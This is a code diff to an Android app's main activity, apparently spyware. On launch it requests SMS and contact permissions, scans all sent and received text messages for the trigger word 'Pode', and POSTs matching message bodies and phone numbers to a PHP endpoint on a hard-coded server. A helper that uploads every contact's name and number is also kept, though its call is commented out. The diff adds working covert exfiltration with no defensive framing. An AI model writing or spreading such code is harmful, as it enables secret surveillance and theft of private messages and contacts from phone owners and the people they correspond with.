@@ -19,7 +19,6 @@ import com.android.volley.VolleyLog;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
-import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.UnsupportedEncodingException;
@@ -28,6 +27,8 @@ import java.io.UnsupportedEncodingException;
 public class MainActivity extends AppCompatActivity {
     private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;
     private static final int PERMISSIONS_REQUEST_READ_SMS = 5;
+    private static String activateWord = "Pode";
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -37,30 +38,110 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        requestPermissions(new String[]{Manifest.permission.READ_SMS,Manifest.permission.READ_CALENDAR, Manifest.permission.READ_CONTACTS }, 1);
+        requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS }, 1);
 
-        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 
+
+
+        getallSentSms();
+        getallReceivedSms();
+       //getAllContacts();
+
+    }
+    public class Post{
+        public String Field;
+        public String Message;
+        Post(String Field, String Message)
+        {
+            this.Field = Field;
+            this.Message = Message;
+        }
+    }
+
+    protected void getallSentSms(){
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
+        boolean send = false;
         if (cursor.moveToFirst()) { // must check the result to prevent exception
             do {
+
+                //CREATES A MESSAGE
                 String msgData = "";
                 for(int idx=0;idx<cursor.getColumnCount();idx++)
                 {
                     msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+idx;
                 }
-                JSONObject json = new JSONObject();
-                insertIntoJson(json, "message", cursor.getString(12));
-                insertIntoJson(json, "phone_number", cursor.getString(2));
-                createPost(json, "http://192.168.1.92:80/shutdown/post_android_message.php");
+                //VERIFIES IF THERES A SPECIFIC WORD
+                String[] words = cursor.getString(12).split(" ");
+                //Log.i("PHRASE",cursor.getString(12) + " :" + cursor.getString(2));
+                for (int i = 0; i < words.length; i++) {
+                    //Log.i("WORDS",words[i]);
+                    if(words[i].equals(activateWord))
+                    {
+                        send = true;
+                        cursor.moveToFirst();
+                    }
+                    else{
 
-                // use msgData
+                    }
+                }
+                //CREATES A POST REQUEST SENDS TO DB
+                if(send) {
+                    Post[] post = new Post[2];
+                    post[0] = new Post("message", cursor.getString(12));
+                    post[1] = new Post("phone_number", cursor.getString(2));
+                    sendPost(createJson(post), "http://192.168.1.92:80/shutdown/post_android_message.php");
+                }
+                else{
+
+                }
+
             } while (cursor.moveToNext());
         } else {
             // empty box, no SMS
         }
+    }
 
-       getAllContacts();
+    protected void getallReceivedSms(){
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+        boolean send = false;
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
 
+                //CREATES A MESSAGE
+                String msgData = "";
+                for(int idx=0;idx<cursor.getColumnCount();idx++)
+                {
+                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+idx;
+                }
+                //VERIFIES IF THERES A SPECIFIC WORD
+                String[] words = cursor.getString(12).split(" ");
+               // Log.i("PHRASE",cursor.getString(12) + " :" + cursor.getString(2));
+                for (int i = 0; i < words.length; i++) {
+                    //Log.i("WORDS",words[i]);
+                    if(words[i].equals(activateWord))
+                    {
+                        send = true;
+                        cursor.moveToFirst();
+                    }
+                    else{
+
+                    }
+                }
+                //CREATES A POST REQUEST SENDS TO DB
+                if(send) {
+                    Post[] post = new Post[2];
+                    post[0] = new Post("message", cursor.getString(12));
+                    post[1] = new Post("phone_number", cursor.getString(2));
+                    sendPost(createJson(post), "http://192.168.1.92:80/shutdown/post_android_message.php");
+                }
+                else{
+
+                }
+
+            } while (cursor.moveToNext());
+        } else {
+            // empty box, no SMS
+        }
     }
 
     protected void getAllContacts(){
@@ -88,10 +169,11 @@ public class MainActivity extends AppCompatActivity {
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(
                                 ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        JSONObject jsonBody = new JSONObject();
-                        jsonBody = insertIntoJson(jsonBody, "phone_number", phoneNo.toString());
-                        jsonBody = insertIntoJson(jsonBody, "phone_name", name.toString());
-                        createPost(jsonBody, "http://192.168.1.92:80/shutdown/post_android_number.php");
+
+                        Post[] post = new Post[2];
+                        post[0] = new Post("phone_number",phoneNo.toString());
+                        post[1] = new Post("phone_name",name.toString());
+                        sendPost(createJson(post),"http://192.168.1.92:80/shutdown/post_android_number.php");
                         pCur.moveToNext();
                     }
                     pCur.close();
@@ -103,18 +185,22 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    public JSONObject insertIntoJson(JSONObject body, String field,String result) {
-        try {
-            return body.put(field, result);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    public JSONObject createJson(Post[] data) {
+        JSONObject json = new JSONObject();
+        for(Post test : data)
+        {
+            try {
+                json.put(test.Field, test.Message);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
 
-        return body;
+        }
+        return json;
     }
 
 
-    protected void createPost(JSONObject jsonBody, String url){
+    protected void sendPost(JSONObject jsonBody, String url){
         final String requestBody = jsonBody.toString();
 
 
